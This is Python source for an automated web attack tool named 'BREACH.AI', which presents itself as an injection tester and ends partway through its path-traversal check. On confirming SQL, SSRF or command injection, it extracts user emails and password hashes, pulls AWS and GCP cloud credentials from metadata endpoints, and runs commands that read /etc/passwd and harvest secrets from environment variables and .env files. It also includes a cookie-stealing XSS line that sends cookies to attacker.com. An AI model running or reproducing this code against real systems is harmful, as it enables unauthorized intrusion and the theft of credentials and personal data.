"""
BREACH.AI - God Level Injection Tester
=======================================
Tests for ALL injection vulnerabilities with REAL PROOF.
SQLi, XSS, SSRF, CMDi, LFI, NoSQL, XXE, SSTI
"""

import asyncio
import re
import json
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from urllib.parse import urljoin, quote, urlencode
import aiohttp

from ..payloads import (
    SQLI_ERROR_BASED, SQLI_BLIND_BOOLEAN, SQLI_TIME_BASED, SQLI_ERRORS_PATTERNS,
    XSS_BASIC, XSS_EVENT_HANDLERS, XSS_WAF_BYPASS, XSS_POLYGLOTS,
    SSRF_LOCALHOST, SSRF_CLOUD_METADATA, SSRF_BYPASS, SSRF_INDICATORS,
    CMDI_PAYLOADS, CMDI_INDICATORS,
    LFI_PAYLOADS, LFI_INDICATORS,
    NOSQL_PAYLOADS,
    XXE_PAYLOADS,
    SSTI_PAYLOADS,
)
from ..spider import DiscoveredEndpoint


@dataclass
class Finding:
    """A vulnerability finding with full proof."""
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    category: str
    title: str
    description: str
    endpoint: str
    method: str
    parameter: str
    payload: str

    # PROOF
    raw_request: str = ""
    raw_response: str = ""
    response_time: float = 0
    evidence: str = ""
    data_exposed: Dict = field(default_factory=dict)

    # IMPACT
    business_impact: int = 0
    impact_explanation: str = ""

    # REPRODUCE
    curl_command: str = ""
    steps: List[str] = field(default_factory=list)

    # FIX
    remediation: str = ""
    cwe_id: str = ""
    owasp: str = ""


class InjectionTester:
    """
    Tests all endpoints for injection vulnerabilities.

    Tests:
    - SQL Injection (error-based, blind boolean, time-based)
    - XSS (reflected, stored, DOM)
    - SSRF (internal services, cloud metadata)
    - Command Injection
    - Path Traversal / LFI
    - NoSQL Injection
    - XXE
    - SSTI
    """

    def __init__(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        timeout: int = 15,
        concurrent: int = 10,
    ):
        self.session = session
        self.base_url = base_url
        self.timeout = timeout
        self.concurrent = concurrent
        self._semaphore = asyncio.Semaphore(concurrent)
        self.findings: List[Finding] = []

    async def test_endpoint(
        self,
        endpoint: DiscoveredEndpoint,
        cookies: Dict = None,
    ) -> List[Finding]:
        """Test a single endpoint for all injection types."""
        findings = []

        # Get all parameters to test
        params = endpoint.params + endpoint.body_params
        if not params:
            # Try common parameter names
            params = ['id', 'q', 'search', 'query', 'url', 'file', 'data', 'name', 'user']

        # Test each parameter
        for param in params[:10]:  # Limit to 10 params per endpoint
            method = "POST" if param in endpoint.body_params else "GET"

            # Run all injection tests
            tests = [
                self._test_sqli(endpoint.url, param, method, cookies),
                self._test_xss(endpoint.url, param, method, cookies),
                self._test_ssrf(endpoint.url, param, method, cookies),
                self._test_cmdi(endpoint.url, param, method, cookies),
                self._test_lfi(endpoint.url, param, method, cookies),
                self._test_nosql(endpoint.url, param, method, cookies),
                self._test_ssti(endpoint.url, param, method, cookies),
            ]

            results = await asyncio.gather(*tests, return_exceptions=True)

            for result in results:
                if isinstance(result, Finding):
                    findings.append(result)
                    self.findings.append(result)

        return findings

    async def test_all_endpoints(
        self,
        endpoints: List[DiscoveredEndpoint],
        cookies: Dict = None,
        progress_callback=None,
    ) -> List[Finding]:
        """Test all endpoints for injections."""
        total = len(endpoints)
        tested = 0

        print(f"\n[INJECTION] Testing {total} endpoints for vulnerabilities...")

        for i in range(0, total, self.concurrent):
            batch = endpoints[i:i + self.concurrent]
            tasks = [self.test_endpoint(ep, cookies) for ep in batch]
            await asyncio.gather(*tasks, return_exceptions=True)

            tested += len(batch)
            if progress_callback:
                progress_callback(tested, total)

            # Progress update
            if tested % 20 == 0:
                print(f"[INJECTION] Progress: {tested}/{total} endpoints, {len(self.findings)} findings")

        print(f"\n[INJECTION] Complete! Found {len(self.findings)} vulnerabilities")
        return self.findings

    async def _send_payload(
        self,
        url: str,
        param: str,
        payload: str,
        method: str = "GET",
        cookies: Dict = None,
        headers: Dict = None,
        content_type: str = None,
    ) -> Tuple[str, float, int, str]:
        """
        Send a payload and return response details.
        Returns: (response_body, response_time, status_code, raw_request)
        """
        async with self._semaphore:
            try:
                start = time.time()

                if method.upper() == "GET":
                    # Add payload as query parameter
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{param}={quote(payload)}"

                    raw_request = f"GET {test_url} HTTP/1.1"

                    async with self.session.get(
                        test_url,
                        cookies=cookies,
                        headers=headers,
                        ssl=False,
                        timeout=self.timeout
                    ) as response:
                        body = await response.text()
                        elapsed = time.time() - start
                        return body, elapsed, response.status, raw_request

                else:  # POST
                    data = {param: payload}
                    ct = content_type or "application/x-www-form-urlencoded"

                    raw_request = f"POST {url} HTTP/1.1\nContent-Type: {ct}\n\n{param}={payload}"

                    if "json" in ct:
                        async with self.session.post(
                            url,
                            json=data,
                            cookies=cookies,
                            headers=headers,
                            ssl=False,
                            timeout=self.timeout
                        ) as response:
                            body = await response.text()
                            elapsed = time.time() - start
                            return body, elapsed, response.status, raw_request
                    else:
                        async with self.session.post(
                            url,
                            data=data,
                            cookies=cookies,
                            headers=headers,
                            ssl=False,
                            timeout=self.timeout
                        ) as response:
                            body = await response.text()
                            elapsed = time.time() - start
                            return body, elapsed, response.status, raw_request

            except asyncio.TimeoutError:
                return "", self.timeout, 0, ""
            except Exception as e:
                return "", 0, 0, ""

    # =========================================================================
    # SQL INJECTION
    # =========================================================================

    async def _test_sqli(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test for SQL injection and EXTRACT DATA if vulnerable."""

        # Phase 1: Error-based SQLi
        for payload in SQLI_ERROR_BASED[:20]:
            try:
                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, payload, method, cookies
                )

                # Check for SQL errors
                body_lower = body.lower()
                for error_pattern in SQLI_ERRORS_PATTERNS:
                    if error_pattern in body_lower:
                        # BREACH IT - Extract actual data as proof
                        extracted_data = await self._extract_sqli_data(url, param, method, cookies)
                        evidence = self._extract_sql_evidence(body)

                        data_exposed = {}
                        if extracted_data:
                            data_exposed = extracted_data
                            evidence = f"{evidence}\n\n**BREACHED DATA:**\n"
                            if extracted_data.get("db_version"):
                                evidence += f"Database: {extracted_data['db_version']}\n"
                            if extracted_data.get("tables"):
                                evidence += f"Tables found: {', '.join(extracted_data['tables'][:10])}\n"
                            if extracted_data.get("sample_data"):
                                evidence += f"Sample records: {len(extracted_data['sample_data'])} rows extracted\n"
                                for row in extracted_data['sample_data'][:3]:
                                    evidence += f"  → {row}\n"

                        return Finding(
                            severity="CRITICAL",
                            category="sqli",
                            title=f"SQL Injection (Error-based) - {param}",
                            description=f"SQL injection confirmed. Database breached - extracted {len(data_exposed.get('sample_data', []))} records.",
                            endpoint=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            raw_request=raw_req,
                            raw_response=body[:2000],
                            response_time=elapsed,
                            evidence=evidence,
                            data_exposed=data_exposed,
                            business_impact=100000,
                            impact_explanation="Full database access CONFIRMED. Extracted actual records as proof.",
                            curl_command=self._build_curl(url, param, payload, method),
                            steps=[
                                f"1. Navigate to {url}",
                                f"2. Set parameter {param} to: {payload}",
                                "3. SQL error confirmed injection point",
                                "4. Extracted database version, tables, and sample data",
                            ],
                            remediation="Use parameterized queries (prepared statements). Never concatenate user input into SQL queries.",
                            cwe_id="CWE-89",
                            owasp="A03:2021 – Injection",
                        )

            except:
                pass

        # Phase 2: UNION-based SQLi (more likely to extract data)
        union_result = await self._test_union_sqli(url, param, method, cookies)
        if union_result:
            return union_result

        # Phase 3: Time-based blind SQLi
        for payload in SQLI_TIME_BASED[:5]:
            try:
                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, payload, method, cookies
                )

                # Check if response was delayed (5+ seconds indicates SQLi)
                if elapsed >= 4.5:
                    return Finding(
                        severity="CRITICAL",
                        category="sqli",
                        title=f"SQL Injection (Time-based Blind) - {param}",
                        description=f"Response delayed by {elapsed:.1f}s when injecting SLEEP/WAITFOR. Blind SQL injection confirmed.",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        raw_request=raw_req,
                        raw_response=f"Response delayed by {elapsed:.1f} seconds",
                        response_time=elapsed,
                        evidence=f"Response time: {elapsed:.1f}s (expected: 5s delay from payload)",
                        business_impact=100000,
                        impact_explanation="Blind SQL injection. Can extract entire database bit-by-bit.",
                        curl_command=self._build_curl(url, param, payload, method),
                        steps=[
                            f"1. Send payload: {payload}",
                            f"2. Observe response delay of {elapsed:.1f}s",
                            "3. Use time-based extraction (sqlmap) to dump database",
                        ],
                        remediation="Use parameterized queries. Implement query timeouts.",
                        cwe_id="CWE-89",
                        owasp="A03:2021 – Injection",
                    )

            except:
                pass

        return None

    async def _test_union_sqli(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test UNION-based SQLi and extract actual data."""

        # First, find the number of columns
        for num_cols in range(1, 15):
            nulls = ",".join(["NULL"] * num_cols)
            payload = f"' UNION SELECT {nulls}--"

            body, elapsed, status, raw_req = await self._send_payload(
                url, param, payload, method, cookies
            )

            # If no error and different response, we found column count
            if status == 200 and "error" not in body.lower():
                # Now extract data
                extracted = await self._union_extract_data(url, param, method, cookies, num_cols)

                if extracted and (extracted.get("tables") or extracted.get("sample_data")):
                    evidence = "**UNION SQLi - DATA EXTRACTED:**\n"
                    if extracted.get("db_version"):
                        evidence += f"Database: {extracted['db_version']}\n"
                    if extracted.get("current_user"):
                        evidence += f"DB User: {extracted['current_user']}\n"
                    if extracted.get("tables"):
                        evidence += f"Tables: {', '.join(extracted['tables'][:15])}\n"
                    if extracted.get("columns"):
                        evidence += f"Columns in users table: {', '.join(extracted['columns'][:10])}\n"
                    if extracted.get("sample_data"):
                        evidence += f"\n**EXTRACTED RECORDS ({len(extracted['sample_data'])}):**\n"
                        for row in extracted['sample_data'][:5]:
                            evidence += f"  → {row}\n"

                    return Finding(
                        severity="CRITICAL",
                        category="sqli",
                        title=f"SQL Injection (UNION) - {param} - DATA BREACHED",
                        description=f"UNION SQLi confirmed. Extracted {len(extracted.get('sample_data', []))} records from database.",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        raw_request=raw_req,
                        raw_response=body[:2000],
                        response_time=elapsed,
                        evidence=evidence,
                        data_exposed=extracted,
                        business_impact=150000,
                        impact_explanation=f"Full database breach. Extracted {len(extracted.get('tables', []))} tables and {len(extracted.get('sample_data', []))} user records.",
                        curl_command=self._build_curl(url, param, payload, method),
                        steps=[
                            f"1. Found {num_cols} columns in query",
                            f"2. Used UNION SELECT to extract database metadata",
                            f"3. Enumerated tables: {', '.join(extracted.get('tables', [])[:5])}",
                            f"4. Extracted {len(extracted.get('sample_data', []))} records",
                        ],
                        remediation="Use parameterized queries. Never concatenate user input.",
                        cwe_id="CWE-89",
                        owasp="A03:2021 – Injection",
                    )

        return None

    async def _union_extract_data(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict,
        num_cols: int,
    ) -> Dict:
        """Extract actual data using UNION injection."""
        extracted = {}

        # Build extraction payloads based on column count
        col_placeholder = ",".join(["NULL"] * (num_cols - 1))

        try:
            # 1. Get database version
            for version_func in ["version()", "@@version", "sqlite_version()"]:
                payload = f"' UNION SELECT {version_func}" + (f",{col_placeholder}" if num_cols > 1 else "") + "--"
                body, _, _, _ = await self._send_payload(url, param, payload, method, cookies)

                # Look for version string in response
                version_patterns = [
                    r'(\d+\.\d+\.\d+[-\w]*)',  # Generic version
                    r'(MySQL[^<\n]{0,50})',
                    r'(PostgreSQL[^<\n]{0,50})',
                    r'(Microsoft SQL[^<\n]{0,50})',
                ]
                for pattern in version_patterns:
                    if match := re.search(pattern, body):
                        extracted["db_version"] = match.group(1)[:100]
                        break
                if extracted.get("db_version"):
                    break

            # 2. Get current user
            for user_func in ["user()", "current_user()", "current_user", "system_user"]:
                payload = f"' UNION SELECT {user_func}" + (f",{col_placeholder}" if num_cols > 1 else "") + "--"
                body, _, _, _ = await self._send_payload(url, param, payload, method, cookies)

                # Look for username pattern
                if match := re.search(r'([a-zA-Z0-9_]+@[a-zA-Z0-9_]+|root|admin|[a-z_]+)', body):
                    extracted["current_user"] = match.group(1)
                    break

            # 3. Get table names
            table_payloads = [
                f"' UNION SELECT table_name" + (f",{col_placeholder}" if num_cols > 1 else "") + " FROM information_schema.tables WHERE table_schema=database()--",
                f"' UNION SELECT name" + (f",{col_placeholder}" if num_cols > 1 else "") + " FROM sqlite_master WHERE type='table'--",
                f"' UNION SELECT tablename" + (f",{col_placeholder}" if num_cols > 1 else "") + " FROM pg_tables WHERE schemaname='public'--",
            ]

            for payload in table_payloads:
                body, _, _, _ = await self._send_payload(url, param, payload, method, cookies)

                # Extract table names from response
                table_patterns = [
                    r'(users?|accounts?|customers?|members?|admins?|employees?|orders?|products?|payments?|sessions?|tokens?|credentials?)',
                ]
                tables = []
                for pattern in table_patterns:
                    tables.extend(re.findall(pattern, body, re.IGNORECASE))

                if tables:
                    extracted["tables"] = list(set(tables))[:20]
                    break

            # 4. If we found a users table, extract sample data
            user_tables = [t for t in extracted.get("tables", []) if "user" in t.lower() or "account" in t.lower() or "admin" in t.lower()]

            if user_tables:
                target_table = user_tables[0]

                # Try to get column names
                col_payload = f"' UNION SELECT column_name" + (f",{col_placeholder}" if num_cols > 1 else "") + f" FROM information_schema.columns WHERE table_name='{target_table}'--"
                body, _, _, _ = await self._send_payload(url, param, col_payload, method, cookies)

                col_patterns = r'(id|username|user_name|email|password|passwd|hash|name|phone|address|token|secret|api_key)'
                columns = list(set(re.findall(col_patterns, body, re.IGNORECASE)))[:10]
                if columns:
                    extracted["columns"] = columns

                # Extract actual user data
                if num_cols >= 2:
                    data_cols = ["username", "email", "password", "name"][:num_cols]
                    select_cols = ",".join(data_cols[:num_cols])
                    data_payload = f"' UNION SELECT {select_cols} FROM {target_table} LIMIT 10--"

                    body, _, _, _ = await self._send_payload(url, param, data_payload, method, cookies)

                    # Try to extract data patterns (emails, usernames)
                    sample_data = []
                    emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', body)
                    if emails:
                        sample_data.extend([f"email: {e}" for e in emails[:5]])

                    # Look for hash patterns (password hashes)
                    hashes = re.findall(r'(\$2[aby]?\$\d+\$[./A-Za-z0-9]{53}|[a-f0-9]{32}|[a-f0-9]{64})', body)
                    if hashes:
                        sample_data.extend([f"password_hash: {h[:20]}..." for h in hashes[:3]])

                    if sample_data:
                        extracted["sample_data"] = sample_data

        except Exception as e:
            pass

        return extracted

    async def _extract_sqli_data(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict,
    ) -> Dict:
        """Try to extract data after confirming error-based SQLi."""
        # Try UNION extraction with different column counts
        for num_cols in range(1, 10):
            result = await self._union_extract_data(url, param, method, cookies, num_cols)
            if result and (result.get("tables") or result.get("sample_data")):
                return result
        return {}

    def _extract_sql_evidence(self, body: str) -> str:
        """Extract SQL-related evidence from response."""
        evidence_parts = []

        # Look for error messages
        for pattern in [
            r"(?:SQL|mysql|postgres|sqlite|oracle|mssql).*?error[^<]{0,200}",
            r"(?:syntax|query|statement).*?(?:failed|error)[^<]{0,200}",
            r"Warning:.*?(?:mysql|pg_|sqlite)[^<]{0,200}",
        ]:
            matches = re.findall(pattern, body, re.IGNORECASE | re.DOTALL)
            evidence_parts.extend(matches[:3])

        return " | ".join(evidence_parts)[:1000] if evidence_parts else "SQL error pattern detected"

    # =========================================================================
    # XSS
    # =========================================================================

    async def _test_xss(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test for XSS."""

        # Unique marker for detection
        marker = f"BREACH{int(time.time())}"

        all_payloads = XSS_BASIC + XSS_EVENT_HANDLERS + XSS_WAF_BYPASS[:10]

        for payload in all_payloads[:25]:
            try:
                # Add marker to payload for accurate detection
                test_payload = payload.replace("alert(1)", f"alert('{marker}')")
                test_payload = test_payload.replace("alert(document.domain)", f"alert('{marker}')")

                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, test_payload, method, cookies
                )

                # Check if payload is reflected
                if payload in body or test_payload in body:
                    # Verify it's not escaped
                    if not self._is_xss_escaped(body, payload):
                        return Finding(
                            severity="HIGH",
                            category="xss",
                            title=f"Reflected XSS - {param}",
                            description=f"XSS payload reflected in response without proper encoding.",
                            endpoint=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            raw_request=raw_req,
                            raw_response=body[:2000],
                            response_time=elapsed,
                            evidence=f"Payload '{payload[:50]}...' reflected unescaped in response",
                            business_impact=25000,
                            impact_explanation="Can steal session cookies, perform actions as victim, phishing attacks.",
                            curl_command=self._build_curl(url, param, payload, method),
                            steps=[
                                f"1. Navigate to {url}",
                                f"2. Set parameter {param} to payload",
                                "3. Observe script execution in browser",
                                "4. Use to steal cookies: <script>document.location='http://attacker.com/?c='+document.cookie</script>",
                            ],
                            remediation="HTML-encode all user input. Use Content-Security-Policy header. Use HttpOnly cookies.",
                            cwe_id="CWE-79",
                            owasp="A03:2021 – Injection",
                        )

            except:
                pass

        return None

    def _is_xss_escaped(self, body: str, payload: str) -> bool:
        """Check if XSS payload is properly escaped."""
        if "<script>" in payload:
            return "&lt;script&gt;" in body or "\\u003cscript" in body or "%3Cscript" in body
        if "onerror=" in payload:
            return "onerror\\u003d" in body or "onerror%3D" in body
        return False

    # =========================================================================
    # SSRF
    # =========================================================================

    async def _test_ssrf(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test for SSRF."""

        # Only test URL-like parameters
        url_params = ['url', 'link', 'redirect', 'return', 'callback', 'next',
                      'src', 'source', 'dest', 'destination', 'uri', 'path',
                      'file', 'load', 'fetch', 'image', 'img', 'proxy']

        if not any(p in param.lower() for p in url_params):
            return None

        # Get baseline
        baseline_body, _, _, _ = await self._send_payload(
            url, param, "https://example.com", method, cookies
        )

        # Test localhost payloads
        for payload in SSRF_LOCALHOST[:10]:
            try:
                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, payload, method, cookies
                )

                # Check for internal content
                for indicator in ['127.0.0.1', 'localhost', 'internal', 'connection refused']:
                    if indicator in body.lower() and indicator not in baseline_body.lower():
                        return Finding(
                            severity="HIGH",
                            category="ssrf",
                            title=f"SSRF (Internal Network) - {param}",
                            description=f"Server made request to internal address: {payload}",
                            endpoint=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            raw_request=raw_req,
                            raw_response=body[:2000],
                            response_time=elapsed,
                            evidence=f"Internal indicator '{indicator}' found in response",
                            business_impact=50000,
                            impact_explanation="Can scan internal network, access internal services, bypass firewalls.",
                            curl_command=self._build_curl(url, param, payload, method),
                            steps=[
                                f"1. Set {param} to {payload}",
                                "2. Observe server makes request to internal address",
                                "3. Port scan: try different ports (22, 3306, 6379, etc.)",
                                "4. Access internal services: Redis, MySQL, etc.",
                            ],
                            remediation="Whitelist allowed URLs/domains. Block internal IP ranges. Use URL validation.",
                            cwe_id="CWE-918",
                            owasp="A10:2021 – SSRF",
                        )

            except:
                pass

        # Test cloud metadata - and BREACH if vulnerable
        for payload in SSRF_CLOUD_METADATA[:10]:
            try:
                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, payload, method, cookies
                )

                # Check for cloud metadata
                for indicator in ['ami-id', 'instance-id', 'computeMetadata', 'meta-data', 'iam/security']:
                    if indicator in body.lower():
                        # BREACH IT - Extract ALL cloud metadata
                        cloud_data = await self._breach_cloud_metadata(url, param, method, cookies)
                        creds = self._extract_aws_creds(body)
                        cloud_data.update(creds)

                        evidence = f"**CLOUD METADATA BREACHED:**\n"
                        if cloud_data.get("instance_id"):
                            evidence += f"Instance ID: {cloud_data['instance_id']}\n"
                        if cloud_data.get("instance_type"):
                            evidence += f"Instance Type: {cloud_data['instance_type']}\n"
                        if cloud_data.get("region"):
                            evidence += f"Region: {cloud_data['region']}\n"
                        if cloud_data.get("iam_role"):
                            evidence += f"IAM Role: {cloud_data['iam_role']}\n"
                        if cloud_data.get("access_key_id"):
                            evidence += f"**AWS ACCESS KEY: {cloud_data['access_key_id']}**\n"
                        if cloud_data.get("secret_access_key"):
                            evidence += f"**AWS SECRET KEY: {cloud_data['secret_access_key'][:10]}...[REDACTED]**\n"
                        if cloud_data.get("security_token"):
                            evidence += f"**SESSION TOKEN: [EXTRACTED]**\n"

                        return Finding(
                            severity="CRITICAL",
                            category="ssrf",
                            title=f"SSRF - CLOUD CREDENTIALS BREACHED - {param}",
                            description=f"Cloud metadata BREACHED. Extracted IAM credentials and instance data.",
                            endpoint=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            raw_request=raw_req,
                            raw_response=body[:2000],
                            response_time=elapsed,
                            evidence=evidence,
                            data_exposed=cloud_data,
                            business_impact=500000,
                            impact_explanation="FULL CLOUD BREACH. Extracted AWS/GCP/Azure credentials. Attacker can access all cloud resources.",
                            curl_command=self._build_curl(url, param, payload, method),
                            steps=[
                                f"1. Set {param} to {payload}",
                                "2. Retrieved instance metadata",
                                "3. Extracted IAM role name",
                                "4. Retrieved temporary credentials",
                                "5. Can now access AWS S3, EC2, RDS, etc.",
                            ],
                            remediation="Block requests to metadata IPs (169.254.169.254). Use IMDSv2 with hop limit. Use VPC endpoints.",
                            cwe_id="CWE-918",
                            owasp="A10:2021 – SSRF",
                        )

            except:
                pass

        return None

    async def _breach_cloud_metadata(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict,
    ) -> Dict:
        """Fully breach cloud metadata and extract all data."""
        breached = {}

        # AWS metadata endpoints
        aws_endpoints = [
            ("http://169.254.169.254/latest/meta-data/instance-id", "instance_id"),
            ("http://169.254.169.254/latest/meta-data/instance-type", "instance_type"),
            ("http://169.254.169.254/latest/meta-data/placement/region", "region"),
            ("http://169.254.169.254/latest/meta-data/local-ipv4", "local_ip"),
            ("http://169.254.169.254/latest/meta-data/public-ipv4", "public_ip"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "iam_role"),
            ("http://169.254.169.254/latest/dynamic/instance-identity/document", "identity_doc"),
        ]

        for endpoint, key in aws_endpoints:
            try:
                body, _, status, _ = await self._send_payload(url, param, endpoint, method, cookies)
                if status == 200 and body and len(body) > 0 and "404" not in body:
                    breached[key] = body.strip()[:200]
            except:
                pass

        # If we found IAM role, get the actual credentials
        if breached.get("iam_role"):
            role_name = breached["iam_role"].split("\n")[0].strip()
            creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"

            try:
                body, _, status, _ = await self._send_payload(url, param, creds_url, method, cookies)
                if status == 200 and "AccessKeyId" in body:
                    # Extract the actual credentials
                    import json as json_module
                    try:
                        creds = json_module.loads(body)
                        breached["access_key_id"] = creds.get("AccessKeyId", "")
                        breached["secret_access_key"] = creds.get("SecretAccessKey", "")
                        breached["security_token"] = creds.get("Token", "")[:50] + "..."
                        breached["expiration"] = creds.get("Expiration", "")
                    except:
                        # Try regex extraction
                        if match := re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', body):
                            breached["access_key_id"] = match.group(1)
                        if match := re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', body):
                            breached["secret_access_key"] = match.group(1)
            except:
                pass

        # GCP metadata
        gcp_endpoints = [
            ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "gcp_project"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/zone", "gcp_zone"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp_token"),
        ]

        for endpoint, key in gcp_endpoints:
            try:
                body, _, status, _ = await self._send_payload(url, param, endpoint, method, cookies)
                if status == 200 and body:
                    breached[key] = body.strip()[:200]
            except:
                pass

        return breached

    def _extract_aws_creds(self, body: str) -> Dict:
        """Extract AWS credentials from metadata response."""
        creds = {}
        patterns = [
            (r'"AccessKeyId"\s*:\s*"([^"]+)"', 'access_key_id'),
            (r'"SecretAccessKey"\s*:\s*"([^"]+)"', 'secret_access_key'),
            (r'"Token"\s*:\s*"([^"]+)"', 'session_token'),
            (r'"instanceId"\s*:\s*"([^"]+)"', 'instance_id'),
        ]

        for pattern, key in patterns:
            match = re.search(pattern, body)
            if match:
                creds[key] = match.group(1)[:20] + "..." if len(match.group(1)) > 20 else match.group(1)

        return creds

    # =========================================================================
    # COMMAND INJECTION
    # =========================================================================

    async def _test_cmdi(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test for command injection and BREACH if vulnerable."""

        for payload in CMDI_PAYLOADS[:15]:
            try:
                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, payload, method, cookies
                )

                # Check for command output
                for indicator in CMDI_INDICATORS:
                    if indicator in body:
                        # BREACH IT - Execute more commands to extract data
                        breached_data = await self._breach_cmdi(url, param, method, cookies)
                        evidence = self._extract_cmdi_evidence(body)

                        breach_evidence = f"**COMMAND EXECUTION CONFIRMED:**\n{evidence}\n"
                        if breached_data:
                            if breached_data.get("whoami"):
                                breach_evidence += f"\nUser: {breached_data['whoami']}"
                            if breached_data.get("hostname"):
                                breach_evidence += f"\nHostname: {breached_data['hostname']}"
                            if breached_data.get("pwd"):
                                breach_evidence += f"\nCurrent dir: {breached_data['pwd']}"
                            if breached_data.get("passwd_users"):
                                breach_evidence += f"\nSystem users: {', '.join(breached_data['passwd_users'][:5])}"
                            if breached_data.get("env_secrets"):
                                breach_evidence += f"\n**SECRETS FROM ENV:**\n"
                                for secret in breached_data['env_secrets'][:3]:
                                    breach_evidence += f"  {secret}\n"

                        return Finding(
                            severity="CRITICAL",
                            category="cmdi",
                            title=f"COMMAND INJECTION - SERVER COMPROMISED - {param}",
                            description=f"RCE confirmed. Executed commands and extracted system data.",
                            endpoint=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            raw_request=raw_req,
                            raw_response=body[:2000],
                            response_time=elapsed,
                            evidence=breach_evidence,
                            data_exposed=breached_data,
                            business_impact=500000,
                            impact_explanation="FULL SERVER COMPROMISE. Can execute any command, read all files, pivot to network.",
                            curl_command=self._build_curl(url, param, payload, method),
                            steps=[
                                f"1. Set {param} to: {payload}",
                                "2. Confirmed command execution",
                                f"3. Extracted user: {breached_data.get('whoami', 'unknown')}",
                                f"4. Extracted hostname: {breached_data.get('hostname', 'unknown')}",
                                "5. Retrieved environment variables with secrets",
                            ],
                            remediation="Never pass user input to shell commands. Use safe APIs. Implement strict input validation.",
                            cwe_id="CWE-78",
                            owasp="A03:2021 – Injection",
                        )

            except:
                pass

        return None

    async def _breach_cmdi(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict,
    ) -> Dict:
        """Breach via command injection - execute commands to extract data."""
        breached = {}

        commands = [
            ("; whoami", "whoami"),
            ("; id", "id"),
            ("; hostname", "hostname"),
            ("; pwd", "pwd"),
            ("; cat /etc/passwd", "passwd"),
            ("; env", "env"),
            ("; cat .env 2>/dev/null", "dotenv"),
            ("; ls -la", "files"),
            ("; uname -a", "uname"),
            ("; ifconfig 2>/dev/null || ip addr", "network"),
        ]

        for cmd, key in commands:
            try:
                body, _, status, _ = await self._send_payload(url, param, cmd, method, cookies)

                if status == 200 and body:
                    if key == "whoami":
                        # Extract username
                        lines = body.strip().split("\n")
                        for line in lines:
                            if line.strip() and len(line.strip()) < 50:
                                breached["whoami"] = line.strip()
                                break
                    elif key == "id":
                        if match := re.search(r'uid=\d+\(([^)]+)\)', body):
                            breached["uid_user"] = match.group(1)
                        if match := re.search(r'gid=\d+\(([^)]+)\)', body):
                            breached["gid_group"] = match.group(1)
                    elif key == "hostname":
                        lines = body.strip().split("\n")
                        for line in lines:
                            if line.strip() and len(line.strip()) < 100:
                                breached["hostname"] = line.strip()
                                break
                    elif key == "pwd":
                        if match := re.search(r'(/[^\s\n]+)', body):
                            breached["pwd"] = match.group(1)
                    elif key == "passwd":
                        users = re.findall(r'^([^:]+):', body, re.MULTILINE)
                        if users:
                            breached["passwd_users"] = users[:15]
                    elif key == "env" or key == "dotenv":
                        # Extract secrets from environment
                        secrets = re.findall(r'((?:PASSWORD|SECRET|KEY|TOKEN|API|DATABASE|DB_)[A-Z_]*=[^\n]+)', body, re.IGNORECASE)
                        if secrets:
                            if "env_secrets" not in breached:
                                breached["env_secrets"] = []
                            breached["env_secrets"].extend(secrets[:10])
                    elif key == "uname":
                        if "Linux" in body or "Darwin" in body:
                            breached["os_info"] = body.strip()[:200]
                    elif key == "network":
                        ips = re.findall(r'inet (\d+\.\d+\.\d+\.\d+)', body)
                        if ips:
                            breached["internal_ips"] = ips[:5]
            except:
                pass

        return breached

    def _extract_cmdi_evidence(self, body: str) -> str:
        """Extract command injection evidence."""
        evidence = []

        # Look for id/whoami output
        if match := re.search(r'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)', body):
            evidence.append(match.group(0))

        # Look for /etc/passwd
        if match := re.search(r'root:x?:\d+:\d+:[^:]*:/root:', body):
            evidence.append(match.group(0))

        # Look for env variables
        if match := re.search(r'(?:PATH|HOME|USER)=[^\n]+', body):
            evidence.append(match.group(0))

        return " | ".join(evidence) if evidence else "Command execution indicator found"

    # =========================================================================
    # PATH TRAVERSAL / LFI
    # =========================================================================

    async def _test_lfi(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict = None,
    ) -> Optional[Finding]:
        """Test for path traversal / LFI and EXTRACT sensitive files."""

        # Only test file-like parameters
        file_params = ['file', 'path', 'doc', 'document', 'template', 'page',
                       'filename', 'include', 'load', 'read', 'content', 'view']

        if not any(p in param.lower() for p in file_params):
            return None

        for payload in LFI_PAYLOADS[:20]:
            try:
                body, elapsed, status, raw_req = await self._send_payload(
                    url, param, payload, method, cookies
                )

                # Check for file content
